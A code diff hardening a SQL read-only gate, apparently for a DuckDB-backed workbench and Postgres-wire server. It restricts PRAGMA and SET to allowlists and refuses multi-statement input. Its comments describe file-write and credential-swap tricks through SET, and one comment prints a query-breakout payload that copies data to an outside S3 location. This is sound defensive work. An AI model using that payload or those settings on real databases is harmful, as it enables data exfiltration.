@@ -147,9 +147,34 @@ const WRITE_VERBS = [
   'copy', 'attach', 'detach', 'install', 'load', 'export', 'checkpoint', 'begin', 'commit', 'rollback',
 ];
 
-/** Verbs that read. `pragma` and `show` are introspection, which psql needs to connect at all. */
+/** Verbs that read. `show` is introspection, which psql needs to connect at all. */
 const READ_VERBS = ['select', 'values', 'table', 'explain'];
-const INTROSPECTION_VERBS = ['show', 'describe', 'pragma', 'summarize'];
+const INTROSPECTION_VERBS = ['show', 'describe', 'summarize'];
+
+/**
+ * `PRAGMA` is an alias for `SET`, so it is only introspection in its no-argument form.
+ *
+ * `PRAGMA enable_profiling='json'` and `PRAGMA profiling_output='/path'` are the same write
+ * primitive as the `SET` spelling below, reached by a verb that used to be on the harmless list.
+ */
+const READ_PRAGMAS = ['database_list', 'show_tables', 'table_info', 'version', 'database_size', 'show_databases'];
+
+/**
+ * Settings a client may change. Everything else is refused, because `SET` is a write primitive
+ * dressed as configuration: `SET profiling_output='<path>'` makes the NEXT read write a file, and
+ * `SET s3_access_key_id` re-points the credential this connection runs under.
+ *
+ * The list is what a Postgres-wire client sends before it can speak at all, and nothing more.
+ */
+const SETTABLE = [
+  'extra_float_digits', 'application_name', 'timezone', 'time zone', 'datestyle',
+  'client_encoding', 'client_min_messages', 'standard_conforming_strings', 'search_path',
+  'statement_timeout', 'intervalstyle',
+  // `RESET ALL` is part of the handshake and clears session settings back to their defaults, which
+  // can only narrow what this connection can do. `SET ALL` is not valid SQL, so the entry is only
+  // ever reached by the RESET spelling.
+  'all',
+];
 
 /** The first word, lowercased. */
 function verbOf(statement: string): string {
@@ -183,10 +208,23 @@ export function classifyStatement(statement: string): SqlKind {
     }
     return 'read';
   }
-  // SET is the one verb a client sends before anything else — `SET extra_float_digits`, timezone,
-  // application_name. Session-local, affects nothing durable, and refusing it means psql cannot
-  // connect at all.
-  if (verb === 'set' || verb === 'reset') return 'introspection';
+  // PRAGMA is a SET alias. Bare `PRAGMA database_list` is introspection; `PRAGMA x=y` is the same
+  // write primitive as SET, so it is judged by the same allowlist.
+  if (verb === 'pragma') {
+    const rest = statement.replace(/^\s*pragma\s+/i, '');
+    const name = (/^([A-Za-z_][A-Za-z0-9_]*)/.exec(rest)?.[1] ?? '').toLowerCase();
+    if (!READ_PRAGMAS.includes(name)) return 'write';
+    // A read pragma with an assignment is still an assignment.
+    return /=/.test(rest) ? 'write' : 'introspection';
+  }
+  // SET is the one verb a client sends before anything else — timezone, application_name — but it
+  // is NOT harmless as a class: `SET profiling_output='<path>'` makes the next read write a file and
+  // `SET s3_access_key_id` re-points this connection's credential. Only the handshake settings pass.
+  if (verb === 'set' || verb === 'reset') {
+    const rest = statement.replace(/^\s*(set|reset)\s+(session\s+|local\s+)?/i, '').toLowerCase();
+    const name = (/^([A-Za-z_][A-Za-z0-9_ ]*?)\s*(=|to\s|$)/.exec(rest)?.[1] ?? '').trim();
+    return SETTABLE.includes(name) ? 'introspection' : 'write';
+  }
   return 'unknown';
 }
 
@@ -215,4 +253,41 @@ export function assertReadOnly(sql: string): Verdict {
     };
   }
   return { allowed: true, kind: 'read', statement: statements[0]!, reason: 'ok' };
+}
+
+/**
+ * The workbench's gate: EXACTLY ONE statement, and it must read.
+ *
+ * ── WHY ONE AND NOT "ALL OF THEM READ" ──────────────────────────────────────────────────────────
+ *
+ * {@link assertReadOnly} answers a different question — it judges a batch, which is right for a
+ * Postgres-wire client sending a prepared sequence. The workbench is a text box, and every sink
+ * behind it COMPOSES the submitted text with SQL of its own: `SELECT * FROM (<text>) LIMIT n`.
+ * That composition is the vulnerability, because the text can close the parenthesis and open a
+ * second statement:
+ *
+ *     SELECT 1) ; COPY (SELECT 1) TO 's3://elsewhere/leak.csv' --
+ *
+ * Every statement in that is judged in isolation by a batch gate, and the breakout is not in any
+ * one of them — it is in the fact that there are two. Refusing a second statement outright is what
+ * closes it, and it closes the whole family rather than the instance.
+ *
+ * Introspection passes: `SHOW TABLES` and `DESCRIBE x` are what a workbench is for.
+ */
+export function assertSingleRead(sql: string): Verdict {
+  const statements = splitStatements(stripComments(sql));
+  if (statements.length === 0) {
+    return { allowed: false, kind: 'unknown', statement: '', reason: 'no statement to run' };
+  }
+  if (statements.length > 1) {
+    return {
+      allowed: false,
+      kind: 'write',
+      statement: statements[1]!,
+      reason:
+        'one statement at a time — the workbench runs a single read, and a second statement is ' +
+        'how a wrapped query becomes a write',
+    };
+  }
+  return assertReadOnly(sql);
 }
